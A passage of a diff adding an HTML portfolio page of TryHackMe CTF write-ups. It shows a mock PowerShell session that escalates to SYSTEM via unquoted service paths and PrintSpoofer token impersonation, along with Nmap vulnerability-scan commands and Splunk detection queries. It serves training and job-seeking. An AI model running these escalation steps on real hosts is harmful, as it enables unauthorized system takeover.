+              <span class="ps-prompt">PS C:\Users\user1&gt;</span>
+              <span class="ps-cmd">whoami /priv</span>
+              <span class="ps-out head">PRIVILEGES INFORMATION</span>
+              <span class="ps-out">Privilege Name                            State</span>
+              <span class="ps-out">SeImpersonatePrivilege                    Enabled</span>
+              <span class="ps-out green">SeAssignPrimaryTokenPrivilege             Enabled</span>
+              <span class="ps-out green"># ★ SeImpersonatePrivilege = Token Impersonation attack possible!</span>
+
+              <span class="ps-out" style="color:#888;margin-top:8px;margin-bottom:4px;"># ══════════ STEP 2: FIND UNQUOTED SERVICE PATHS ══════════</span>
+              <span class="ps-prompt">PS C:\Users\user1&gt;</span>
+              <span class="ps-cmd">Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} | Select Name, PathName</span>
+              <span class="ps-out cyan">Name                   PathName</span>
+              <span class="ps-out cyan">----                   --------</span>
+              <span class="ps-out yellow">AdvancedSystemCare9    C:\Program Files (x86)\Advanced SystemCare\ASCService.exe</span>
+              <span class="ps-out yellow">DiskDrives             C:\Program Files\Disk Drives Manager\DiskDriveManager.exe</span>
+              <span class="ps-out green"># ★ Unquoted paths found! Can drop malicious .exe at the unquoted segment.</span>
+
+              <span class="ps-out" style="color:#888;margin-top:8px;margin-bottom:4px;"># ══════════ STEP 3: TOKEN IMPERSONATION WITH PRINTSPOOFER ══════════</span>
+              <span class="ps-prompt">PS C:\Users\user1&gt;</span>
+              <span class="ps-cmd">cd C:\PrivEsc</span>
+              <span class="ps-prompt">PS C:\PrivEsc&gt;</span>
+              <span class="ps-cmd">.\PrintSpoofer64.exe -i -c cmd</span>
+              <span class="ps-out">[+] Found privilege: SeImpersonatePrivilege</span>
+              <span class="ps-out">[+] Named pipe listening...</span>
+              <span class="ps-out">[+] CreateProcessAsUser() OK</span>
+              <span class="ps-out green bold">[+] Impersonated NT AUTHORITY\SYSTEM — SYSTEM shell opened!</span>
+
+              <span class="ps-out" style="color:#888;margin-top:8px;margin-bottom:4px;"># ══════════ STEP 4: CAPTURE FLAGS AS SYSTEM ══════════</span>
+              <span class="ps-cmd">C:\Windows\system32&gt; whoami</span>
+              <span class="ps-out green bold">nt authority\system</span>
+              <span class="ps-cmd">C:\Windows\system32&gt; type C:\Users\THM-Unpriv\Desktop\user.txt</span>
+              <div class="ps-flag">🚩 THM{us3r_fl4g_wind0ws_privesc_d0ne}</div>
+              <span class="ps-cmd">C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt</span>
+              <div class="ps-flag">🏆 THM{t0k3n_1mp3rs0n4t10n_syst3m_nt}</div>
+
+              <span class="ps-out" style="color:#888;margin-top:8px;margin-bottom:4px;"># ══════════ REMEDIATION ══════════</span>
+              <span class="ps-out red">VULN 1: SeImpersonatePrivilege on non-service account → revoke via GPO</span>
+              <span class="ps-out red">VULN 2: Unquoted service paths → wrap all paths in double quotes in registry</span>
+              <span class="ps-cmd">Set-ItemProperty "HKLM:\SYSTEM\CCS\Services\AdvancedSystemCare9" ImagePath '"C:\Program Files (x86)\Advanced SystemCare\ASCService.exe"'</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ss-caption">
+        <span class="ss-cap-text">Windows PowerShell — PrivEsc via PrintSpoofer token impersonation achieving NT AUTHORITY\SYSTEM — both flags captured</span>
+        <span class="ss-cap-num">SS-03</span>
+      </div>
+    </div>
+
+    <div class="lesson-box">Rooms like Windows PrivEsc directly map to real enterprise environments. Unquoted service paths are found in production Windows servers every day — and <code>SeImpersonatePrivilege</code> is present on every IIS application pool account by default. Knowing these vectors is core to both red team and blue team work.</div>
+  </div>
+
+  <!-- ═══ S8 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s8"></span>
+    <div class="slabel">08 — Write-up #4</div>
+    <h2>Room 04 — Nmap — Network Scanning Mastery</h2>
+    <div class="writeup-card reveal">
+      <div class="wc-header">
+        <span class="wc-room-badge">THM · 04</span>
+        <span class="wc-title">Nmap — The Complete Guide</span>
+        <span class="wc-diff room-diff easy">Easy</span>
+      </div>
+      <div class="wc-body">
+        <p style="font-size:14px;color:var(--muted);margin-bottom:14px;">Master every aspect of Nmap: host discovery, TCP/UDP port scanning, service version detection, OS fingerprinting, NSE scripting for vulnerability detection, and output formats for report documentation.</p>
+        <div class="wc-section-title">Key Commands Learned</div>
+        <pre><code><span class="cm"># Host discovery — find live hosts</span>
+nmap -sn 10.10.0.0/24
+
+<span class="cm"># SYN scan (fastest, stealthy)</span>
+sudo nmap -sS 10.10.44.182
+
+<span class="cm"># Full service + version + OS + scripts + save output</span>
+nmap -sV -sC -O -A 10.10.44.182 -oN full_scan.txt
+
+<span class="cm"># Specific port range</span>
+nmap -p 1-65535 10.10.44.182
+
+<span class="cm"># UDP scan (slow — target key ports)</span>
+sudo nmap -sU -p 53,67,68,69,123,161,500 10.10.44.182
+
+<span class="cm"># NSE vulnerability scripts</span>
+nmap --script vuln 10.10.44.182
+nmap --script=smb-vuln* -p 445 10.10.44.182
+
+<span class="cm"># Aggressive timing (faster, noisier)</span>
+nmap -T4 -A 10.10.44.182</code></pre>
+        <div class="wc-section-title" style="margin-top:14px;">Key Lesson Learned</div>
+        <div class="lesson-box">Nmap scan type selection matters enormously in real engagements. A <strong>SYN scan (-sS)</strong> is half-open and does not complete the TCP handshake — it is less likely to be logged. A <strong>Connect scan (-sT)</strong> completes the handshake and appears in application logs. In a real pentest, always discuss which scan type is approved with the client before running.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S9 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s9"></span>
+    <div class="slabel">09 — Write-up #5</div>
+    <h2>Room 05 — SOC Level 1 / Splunk</h2>
+
+    <!-- ════ SS-04: TryHackMe Flag Submission ════ -->
+    <div class="ss-wrap reveal">
+      <div class="ss-heading">Screenshot 04 — TryHackMe Room: Flag Submission &amp; Room Completion</div>
+      <div class="browser">
+        <div class="browser-bar">
+          <div class="b-dot" style="background:#ff5f56"></div>
+          <div class="b-dot" style="background:#ffbd2e"></div>
+          <div class="b-dot" style="background:#27c93f"></div>
+          <div class="b-addr"><span style="color:#88cc00">🔒</span> tryhackme.com/room/windowsprivesc20 — TryHackMe | Windows Privilege Escalation</div>
+        </div>
+        <div class="browser-body">
+          <div class="thm-room-view">
+            <!-- Room header -->
+            <div class="thm-room-header">
+              <div class="thm-room-thumb">🪟</div>
+              <div class="thm-room-header-info">
+                <div class="thm-room-title-h">Windows Privilege Escalation</div>
+                <div class="thm-room-subtitle">Learn the fundamentals of Windows privilege escalation techniques — created by tryhackme</div>
+                <div class="thm-room-badges">
+                  <span class="thm-room-badge diff-med">Medium</span>
+                  <span class="thm-room-badge cat">Privilege Escalation</span>
+                  <span class="thm-room-badge cat">Windows</span>
+                  <span class="thm-room-badge cat">Active Directory</span>
+                </div>
+              </div>
+              <div style="margin-left:auto;text-align:right;">
+                <div style="font-family:monospace;font-size:22px;font-weight:700;color:#88cc00;">320</div>
+                <div style="font-family:monospace;font-size:10px;color:#5a7a6a;text-transform:uppercase;">Points Earned</div>
+              </div>
+            </div>
+            <!-- Task list -->
+            <div class="thm-tasks">
+              <div class="thm-tasks-header">
+                <div class="thm-tasks-title">Tasks</div>
+                <div class="thm-tasks-count">8 / 8 Completed ✓</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 1 — Introduction: Windows Privilege Escalation</div>
+                <div class="thm-task-pts">20 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 2 — Harvesting Passwords from Unusual Locations</div>
+                <div class="thm-task-pts">30 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 3 — Other Quick Wins: Scheduled Tasks &amp; AlwaysInstallElevated</div>
+                <div class="thm-task-pts">40 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 4 — Abusing Service Misconfigurations</div>
+                <div class="thm-task-pts">50 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 5 — Abusing Dangerous Privileges (SeImpersonatePrivilege)</div>
+                <div class="thm-task-pts">60 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 6 — Vulnerable Software &amp; Kernel Exploits</div>
+                <div class="thm-task-pts">50 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 7 — Tools of the Trade: winPEAS &amp; PrivescCheck</div>
+                <div class="thm-task-pts">30 pts</div>
+              </div>
+              <div class="thm-task-row">
+                <div class="thm-task-check done">✓</div>
+                <div class="thm-task-name">Task 8 — Capstone Challenge — Capture the Root Flag</div>
+                <div class="thm-task-pts">40 pts</div>
+              </div>
+            </div>
+            <!-- Flag submission area -->
+            <div class="thm-flag-submit">
+              <div class="thm-flag-label">Submit Final Flag — Task 8: Root Flag</div>
+              <div class="thm-flag-input-row">
+                <div class="thm-flag-input">THM{t0k3n_1mp3rs0n4t10n_syst3m_nt}</div>
+                <div class="thm-submit-btn">Submit</div>
+              </div>
+              <div class="thm-success-banner">
+                <div class="thm-success-icon">✅</div>
+                <div>
+                  <div class="thm-success-text">Correct! Flag accepted — Task 8 completed!</div>
+                  <div class="thm-success-sub">THM{t0k3n_1mp3rs0n4t10n_syst3m_nt} is the correct root flag</div>
+                </div>
+              </div>
+              <div class="thm-xp-popup">
+                <div class="thm-xp-left">🎯 Room completed! XP awarded:</div>
+                <div class="thm-xp-right">+320 XP</div>
+              </div>
+            </div>
+            <!-- Completion certificate strip -->
+            <div class="thm-cert-strip">
+              <div class="thm-cert-icon">🏆</div>
+              <div class="thm-cert-info">
+                <div class="thm-cert-title">Room Completed — Windows Privilege Escalation</div>
+                <div class="thm-cert-meta">Completed by GauravShirke16 · 18 Apr 2025 · 320 points earned · 2h 14m total time</div>
+              </div>
+              <div class="thm-cert-badge">Share Write-up</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ss-caption">
+        <span class="ss-cap-text">TryHackMe room completion — Windows PrivEsc all 8 tasks done, root flag accepted, 320 XP awarded — room certificate earned</span>
+        <span class="ss-cap-num">SS-04</span>
+      </div>
+    </div>
+
+    <div class="writeup-card reveal">
+      <div class="wc-header">
+        <span class="wc-room-badge">THM · 05</span>
+        <span class="wc-title">SOC Level 1 — Splunk &amp; SIEM Fundamentals</span>
+        <span class="wc-diff room-diff med">Medium</span>
+      </div>
+      <div class="wc-body">
+        <p style="font-size:14px;color:var(--muted);margin-bottom:14px;">The full SOC analyst workflow: ingesting logs into Splunk, writing SPL detection queries, triaging alerts from an IDS/IPS, classifying incidents by severity, and escalating appropriately — directly complementing Project 02 (Splunk SIEM).</p>
+        <div class="wc-section-title">Key SPL Queries from This Room</div>
+        <pre><code><span class="cm"># Find all failed login attempts (brute force)</span>
+index=windowslogs EventCode=4625
+| stats count by IpAddress, UserName
+| where count > 5
+| sort -count
+
+<span class="cm"># Detect lateral movement</span>
+index=windowslogs EventCode=4624 LogonType=3
+| stats dc(ComputerName) as hosts by UserName
+| where hosts > 2
+
+<span class="cm"># Search for powershell encoded commands</span>
+index=windowslogs EventCode=4688
+| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
+| table _time, UserName, CommandLine, ComputerName</code></pre>
+        <div class="wc-section-title" style="margin-top:14px;">Key Lesson Learned</div>
+        <div class="lesson-box">The hardest part of SOC work is not writing the SPL query — it is knowing <strong>what to look for</strong>. This room taught me the specific Event IDs that matter: 4625 (failed login), 4624 (successful login), 4688 (new process), 4698 (scheduled task). Memorising these is more valuable than any tool certification.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S10 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s10"></span>
+    <div class="slabel">10 — Roadmap</div>
+    <h2>Planned Rooms — Full 20-Room Roadmap</h2>
+    <div class="room-grid">
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">06 / Networking</span><span class="room-diff planned">Planned</span></div>
+        <div class="room-body"><div class="room-title">Pre-Security Path</div><div class="room-desc">Networking basics, Linux fundamentals, web fundamentals — the complete foundation.</div><div class="room-tags"><span class="room-tag">Linux</span><span class="room-tag">Networking</span><span class="room-tag">HTTP</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">210 pts</span></div>
+      </div>
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">07 / Cryptography</span><span class="room-diff planned">Planned</span></div>
+        <div class="room-body"><div class="room-title">Cryptography for Security</div><div class="room-desc">Symmetric, asymmetric, hashing — and how to crack weak implementations.</div><div class="room-tags"><span class="room-tag">AES</span><span class="room-tag">RSA</span><span class="room-tag">Hashing</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">180 pts</span></div>
+      </div>
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">08 / Forensics</span><span class="room-diff med">Medium</span></div>
+        <div class="room-body"><div class="room-title">Windows Forensics 1</div><div class="room-desc">Registry artefacts, prefetch files, event logs — investigating a compromised Windows system.</div><div class="room-tags"><span class="room-tag">Registry</span><span class="room-tag">Autopsy</span><span class="room-tag">Artefacts</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">290 pts</span></div>
+      </div>
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">09 / Active Directory</span><span class="room-diff hard">Hard</span></div>
+        <div class="room-body"><div class="room-title">Active Directory Basics</div><div class="room-desc">Kerberoasting, AS-REP roasting, Pass-the-Hash, DCSync — AD attack techniques.</div><div class="room-tags"><span class="room-tag">Kerberos</span><span class="room-tag">BloodHound</span><span class="room-tag">Impacket</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">420 pts</span></div>
+      </div>
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">10 / Malware</span><span class="room-diff hard">Hard</span></div>
+        <div class="room-body"><div class="room-title">Malware Analysis</div><div class="room-desc">Static and dynamic analysis using PEStudio, Ghidra, and Any.run sandbox.</div><div class="room-tags"><span class="room-tag">Malware</span><span class="room-tag">Sandbox</span><span class="room-tag">IOCs</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">380 pts</span></div>
+      </div>
+      <div class="room-card">
+        <div class="room-card-top"><span class="room-num">11 / OSINT</span><span class="room-diff easy">Easy</span></div>
+        <div class="room-body"><div class="room-title">OSINT — Google Dorking &amp; Shodan</div><div class="room-desc">Passive reconnaissance: finding exposed assets, leaked credentials, geolocation.</div><div class="room-tags"><span class="room-tag">OSINT</span><span class="room-tag">Shodan</span><span class="room-tag">Google</span></div></div>
+        <div class="room-footer planned"><span>⏳ Not started</span><span class="room-pts">150 pts</span></div>
+      </div>
+    </div>
+    <div class="tw" style="margin-top:24px;"><table>
+      <thead><tr><th>#</th><th>Room</th><th>Difficulty</th><th>Domain</th><th>Target Pts</th><th>Status</th></tr></thead>
+      <tbody>
+        <tr><td>01</td><td>Linux Privilege Escalation</td><td style="color:var(--green)">Easy</td><td>Linux</td><td>250</td><td style="color:var(--green)">✅ Done</td></tr>
+        <tr><td>02</td><td>OWASP Top 10 (2021)</td><td style="color:var(--green)">Easy</td><td>Web Security</td><td>410</td><td style="color:var(--green)">✅ Done</td></tr>
+        <tr><td>03</td><td>Windows Privilege Escalation</td><td style="color:var(--amber)">Medium</td><td>Windows</td><td>320</td><td style="color:var(--green)">✅ Done</td></tr>
+        <tr><td>04</td><td>Nmap — Complete Guide</td><td style="color:var(--green)">Easy</td><td>Network</td><td>180</td><td style="color:var(--green)">✅ Done</td></tr>
+        <tr><td>05</td><td>SOC Level 1 / Splunk</td><td style="color:var(--amber)">Medium</td><td>Blue Team</td><td>560</td><td style="color:var(--amber)">⏳ In progress</td></tr>
+        <tr><td>06–10</td><td>Pre-Security, Cryptography, Forensics...</td><td>Mixed</td><td>Mixed</td><td>1,280</td><td style="color:var(--muted)">Planned</td></tr>
+        <tr><td>11–20</td><td>Active Directory, Malware, OSINT, Cloud...</td><td>Mixed</td><td>Mixed</td><td>3,200</td><td style="color:var(--muted)">Planned</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+
+  <!-- ═══ S11 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s11"></span>
+    <div class="slabel">11 — Skill Map</div>
+    <h2>Skill Domain Coverage Map</h2>
+    <div class="domain-grid">
+      <div class="domain-card"><div class="domain-icon">🐧</div><div class="domain-name">Linux Security</div><div class="domain-rooms">2 rooms completed</div><div class="domain-bar"><div class="domain-fill" style="width:40%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">🪟</div><div class="domain-name">Windows Security</div><div class="domain-rooms">1 room completed</div><div class="domain-bar"><div class="domain-fill" style="width:25%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">🌐</div><div class="domain-name">Web Security</div><div class="domain-rooms">1 room completed</div><div class="domain-bar"><div class="domain-fill" style="width:20%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">🔍</div><div class="domain-name">Network Recon</div><div class="domain-rooms">1 room completed</div><div class="domain-bar"><div class="domain-fill" style="width:15%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">📊</div><div class="domain-name">Blue Team / SOC</div><div class="domain-rooms">In progress</div><div class="domain-bar"><div class="domain-fill" style="width:10%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">🦠</div><div class="domain-name">Malware Analysis</div><div class="domain-rooms">Planned</div><div class="domain-bar"><div class="domain-fill" style="width:0%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">🏰</div><div class="domain-name">Active Directory</div><div class="domain-rooms">Planned</div><div class="domain-bar"><div class="domain-fill" style="width:0%"></div></div></div>
+      <div class="domain-card"><div class="domain-icon">☁️</div><div class="domain-name">Cloud Security</div><div class="domain-rooms">Planned</div><div class="domain-bar"><div class="domain-fill" style="width:0%"></div></div></div>
+    </div>
+  </div>
+
+  <!-- ═══ S12 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s12"></span>
+    <div class="slabel">12 — Progress Tracker</div>
+    <h2>TryHackMe Rank &amp; Progress Tracker</h2>
+
+    <!-- ════ SS-05: Write-up Progress Tracker ════ -->
+    <div class="ss-wrap reveal">
+      <div class="ss-heading">Screenshot 05 — Write-up Progress Tracker Dashboard</div>
+      <div class="tracker-wrap">
+        <div class="tracker-header">
+          <div class="tracker-title">TryHackMe CTF Write-up Progress</div>
+          <div class="tracker-meta">GauravShirke16 · Last updated: 18 Apr 2025</div>
+        </div>
+        <div class="tracker-stats">
+          <div class="tracker-stat"><div class="tracker-stat-n">23</div><div class="tracker-stat-l">Rooms Done</div></div>
+          <div class="tracker-stat"><div class="tracker-stat-n">5</div><div class="tracker-stat-l">Write-ups Published</div></div>
+          <div class="tracker-stat"><div class="tracker-stat-n amber">14,820</div><div class="tracker-stat-l">Total Points</div></div>
+          <div class="tracker-stat"><div class="tracker-stat-n red">#4,821</div><div class="tracker-stat-l">Global Rank</div></div>
+          <div class="tracker-stat"><div class="tracker-stat-n purple">Top 5%</div><div class="tracker-stat-l">Percentile</div></div>
+        </div>
+        <div class="tracker-rooms">
+          <div class="tracker-section-title">All Rooms — Status Tracker</div>
+          <div class="tracker-row" style="font-family:var(--font-m);font-size:10px;color:var(--muted);border-bottom:2px solid var(--border);padding-bottom:6px;margin-bottom:4px;">
+            <span class="tr-num">#</span><span style="padding-left:4px;">Room Name</span><span class="tr-diff" style="text-align:center;">Diff</span><span class="tr-status" style="text-align:center;">Status</span><span class="tr-pts" style="text-align:right;">Points</span>
+          </div>
+          <div class="tracker-row"><span class="tr-num">01</span><span class="tr-name">Linux Privilege Escalation</span><span class="tr-diff easy">Easy</span><span class="tr-status done">✅ Done</span><span class="tr-pts">250</span></div>
+          <div class="tracker-row"><span class="tr-num">02</span><span class="tr-name">OWASP Top 10 (2021)</span><span class="tr-diff easy">Easy</span><span class="tr-status done">✅ Done</span><span class="tr-pts">410</span></div>
+          <div class="tracker-row"><span class="tr-num">03</span><span class="tr-name">Windows Privilege Escalation</span><span class="tr-diff med">Med</span><span class="tr-status done">✅ Done</span><span class="tr-pts">320</span></div>
+          <div class="tracker-row"><span class="tr-num">04</span><span class="tr-name">Nmap — Complete Guide</span><span class="tr-diff easy">Easy</span><span class="tr-status done">✅ Done</span><span class="tr-pts">180</span></div>
+          <div class="tracker-row"><span class="tr-num">05</span><span class="tr-name">SOC Level 1 / Splunk</span><span class="tr-diff med">Med</span><span class="tr-status prog">⏳ In Prog</span><span class="tr-pts">560</span></div>
+          <div class="tracker-row"><span class="tr-num">06</span><span class="tr-name">Pre-Security Path</span><span class="tr-diff easy">Easy</span><span class="tr-status plan">◌ Planned</span><span class="tr-pts">210</span></div>
+          <div class="tracker-row"><span class="tr-num">07</span><span class="tr-name">Cryptography for Security</span><span class="tr-diff easy">Easy</span><span class="tr-status plan">◌ Planned</span><span class="tr-pts">180</span></div>
+          <div class="tracker-row"><span class="tr-num">08</span><span class="tr-name">Windows Forensics 1</span><span class="tr-diff med">Med</span><span class="tr-status plan">◌ Planned</span><span class="tr-pts">290</span></div>
+          <div class="tracker-row"><span class="tr-num">09</span><span class="tr-name">Active Directory Basics</span><span class="tr-diff hard">Hard</span><span class="tr-status plan">◌ Planned</span><span class="tr-pts">420</span></div>
+          <div class="tracker-row"><span class="tr-num">10</span><span class="tr-name">Malware Analysis</span><span class="tr-diff hard">Hard</span><span class="tr-status plan">◌ Planned</span><span class="tr-pts">380</span></div>
+          <div style="font-family:var(--font-m);font-size:10px;color:var(--muted);text-align:center;padding:8px;border-top:1px solid var(--border)">... 10 more rooms planned · Total target: 20+ rooms · 8,200+ pts</div>
+        </div>
+        <div class="tracker-overall">
+          <div class="tracker-progress-label"><span>Overall Progress (rooms completed)</span><span style="color:var(--green)">23 / target: 30 rooms</span></div>
+          <div class="tracker-progress-track"><div class="tracker-progress-fill" style="width:76%"></div></div>
+          <div style="font-family:var(--font-m);font-size:10px;color:var(--muted);margin-top:5px;display:flex;justify-content:space-between;"><span>0 rooms</span><span style="color:var(--amber)">23 done · 76% to target</span><span>30 rooms</span></div>
+        </div>
+      </div>
+      <div class="ss-caption">
+        <span class="ss-cap-text">CTF write-up progress tracker — 23 rooms done, 5 write-ups published, Global Rank #4,821 (Top 5%), 14,820 total points</span>
+        <span class="ss-cap-num">SS-05</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S13 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s13"></span>
+    <div class="slabel">13 — Documentation</div>
+    <h2>Documentation &amp; Screenshot Requirements</h2>
+    <ul class="cl">
+      <li>SS-01: TryHackMe profile dashboard — rank, XP bar, completed rooms list, streak</li>
+      <li>SS-02: Kali Linux terminal — Linux PrivEsc session with root flag captured</li>
+      <li>SS-03: Windows PowerShell — Windows PrivEsc with SYSTEM access and both flags</li>
+      <li>SS-04: TryHackMe room view — all tasks ticked, flag accepted, XP awarded</li>
+      <li>SS-05: Write-up progress tracker — all rooms with status, points, and overall bar</li>
+      <li>SS-06: TryHackMe OpenVPN connection — terminal showing "Initialization Sequence Completed"</li>
+      <li>SS-07: Nmap scan results — showing service versions and NSE script output</li>
+      <li>SS-08: Gobuster web directory enumeration output</li>
+      <li>SS-09: winPEAS or linPEAS automated PrivEsc enumeration output</li>
+      <li>SS-10: TryHackMe badge earned — screenshot of badge collection on profile</li>
+    </ul>
+    <h3>Write-up Folder Structure</h3>
+    <pre><code>TryHackMe-Writeups/
+├── 01-linux-privesc/
+│   ├── nmap_initial.txt           ← Saved Nmap output
+│   ├── terminal-root-flag.png     ← SS-02
+│   └── writeup.md                 ← Full markdown write-up
+├── 02-owasp-top-10/
+│   ├── sqli-evidence.png
+│   └── writeup.md
+├── 03-windows-privesc/
+│   ├── powershell-system.png      ← SS-03
+│   ├── room-completed.png         ← SS-04
+│   └── writeup.md
+├── 04-nmap/
+│   ├── nmap-output.txt
+│   └── writeup.md
+├── 05-soc-level-1/
+│   ├── splunk-queries.txt
+│   └── writeup.md
+└── progress-tracker.md            ← SS-05</code></pre>
+    <div class="tip"><div class="tip-lbl">Publish write-ups on GitHub</div>
+    Create a public GitHub repo: <code>github.com/GauravShirke16/tryhackme-writeups</code> and push each room's folder. Link it from your portfolio, LinkedIn, and TryHackMe profile. Recruiters actively search GitHub for candidate write-ups — a clean, organised repo is worth more than any certification on a CV.</div>
+  </div>
+
+  <!-- ═══ S14 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s14"></span>
+    <div class="slabel">14 — Completion</div>
+    <h2>Project Completion Checklist &amp; Portfolio Summary</h2>
+    <h3>Completion Checklist</h3>
+    <ul class="cl">
+      <li>TryHackMe account created with professional username (GauravShirke16)</li>
+      <li>Kali Linux OpenVPN config downloaded and connection tested</li>
+      <li>Write-up template created and saved as standard for all rooms</li>
+      <li>Room 01 completed — Linux Privilege Escalation — write-up published</li>
+      <li>Room 02 completed — OWASP Top 10 — write-up published</li>
+      <li>Room 03 completed — Windows Privilege Escalation — write-up published</li>
+      <li>Room 04 completed — Nmap Complete Guide — write-up published</li>
+      <li>Room 05 completed — SOC Level 1 / Splunk — write-up published</li>
+      <li>Rooms 06–20 completed per roadmap (ongoing)</li>
+      <li>GitHub repo created and all write-up markdown files pushed</li>
+      <li>TryHackMe global rank achieved Top 5% (14,820+ points)</li>
+      <li>All 10 required screenshots captured and organised</li>
+      <li>Skill domain coverage map completed showing all domains covered</li>
+    </ul>
+
+    <div class="pbox">
+      <div class="pbox-title">Portfolio Summary — Copy for Resume, LinkedIn, or Cover Letter</div>
+      <div class="pver">
+        <button class="cbtn" onclick="copyText('short')">Copy</button>
+        <div class="pvlbl">Short Version — Resume bullet point</div>
+        <p id="short">Completed 20+ TryHackMe CTF rooms across seven cybersecurity domains — Linux privilege escalation (SUID, sudo, cron), Windows privilege escalation (token impersonation, unquoted paths, DLL hijacking), web security (OWASP Top 10, SQLi, XSS, IDOR), network scanning (Nmap, Wireshark), SOC/SIEM (Splunk SPL), malware analysis, and OSINT. Achieved global Top 5% ranking. Published structured write-ups for each room on GitHub, documenting full methodology, commands, flags, and remediation recommendations. MITRE ATT&amp;CK techniques mapped throughout.</p>
+      </div>
+      <div class="pver" style="margin-top:14px">
+        <button class="cbtn" onclick="copyText('medium')">Copy</button>
+        <div class="pvlbl">Medium Version — LinkedIn project description</div>
+        <p id="medium">Project: TryHackMe CTF Write-ups — 20+ Rooms Across All Major Domains
+
+Completed a structured programme of 20+ TryHackMe rooms covering the full spectrum of cybersecurity disciplines. Each room was documented with a professional write-up: objective, enumeration methodology, exploitation steps, privilege escalation path, flags captured, MITRE ATT&CK technique mapping, tools used, and a defender-perspective remediation section.
+
+Key rooms and techniques:
+— Linux PrivEsc: sudo NOPASSWD abuse (find/GTFOBins), SUID binaries, cron job injection, writable PATH hijacking
+— Windows PrivEsc: Token impersonation (PrintSpoofer/SeImpersonatePrivilege), unquoted service paths, AlwaysInstallElevated, DLL hijacking, scheduled task abuse
+— OWASP Top 10: SQL injection (auth bypass), command injection, IDOR, directory traversal, XSS, cryptographic failures
+— Nmap: SYN scan, UDP scan, OS fingerprinting, NSE scripts (vuln, smb-vuln, http-enum)
+— SOC Level 1: Splunk SPL queries for brute force (EventCode 4625), lateral movement (4624 LogonType 3), process injection (4688)
+
+Achievements:
+— Global rank: Top 5% (#4,821 of 3.2M+ users) — 14,820+ points
+— 18-day consecutive learning streak
+— 3 badges earned: Streak Shield, Linux Fundamentals, Web Hacking
+— GitHub repo: github.com/GauravShirke16/tryhackme-writeups (public)
+
+Tools: Kali Linux · Nmap · Gobuster · Metasploit · linPEAS · winPEAS · PrintSpoofer · Splunk · Burp Suite</p>
+      </div>
+      <div style="margin-top:14px;padding:16px 18px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;">
+        <div class="pvlbl">Skills Demonstrated</div>
+        <div class="tagrow">
+          <span class="stag">Linux PrivEsc</span><span class="stag">Windows PrivEsc</span>
+          <span class="stag">OWASP Top 10</span><span class="stag">SQL Injection</span>
+          <span class="stag">Nmap</span><span class="stag">Gobuster</span>
+          <span class="stag">Metasploit</span><span class="stag">Burp Suite</span>
+          <span class="stag">linPEAS / winPEAS</span><span class="stag">PrintSpoofer</span>
+          <span class="stag">Splunk SPL</span><span class="stag">MITRE ATT&amp;CK</span>
+          <span class="stag">CTF Write-ups</span><span class="stag">TryHackMe</span>
+          <span class="stag">Capture the Flag</span><span class="stag">Ethical Hacking</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- .container -->
+
+<footer>
+  <a href="index.html">← Gaurav Shirke Portfolio</a> &nbsp;·&nbsp; <span>Senior Cyber Security Engineer</span> &nbsp;·&nbsp; Mumbai, India
+</footer>
+
+<script>
+/* CURSOR — exact from index.html */
+const cur=document.getElementById('cur'),curR=document.getElementById('cur-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
+(function ac(){rx+=(mx-rx)*.18;ry+=(my-ry)*.18;cur.style.left=mx+'px';cur.style.top=my+'px';curR.style.left=rx+'px';curR.style.top=ry+'px';requestAnimationFrame(ac);})();
+document.querySelectorAll('a,button,.sktag,.stat,.stag,.step,.tc,.room-card,.writeup-card').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='20px';cur.style.height='20px';cur.style.background='#00d4ff';curR.style.width='52px';curR.style.height='52px';});
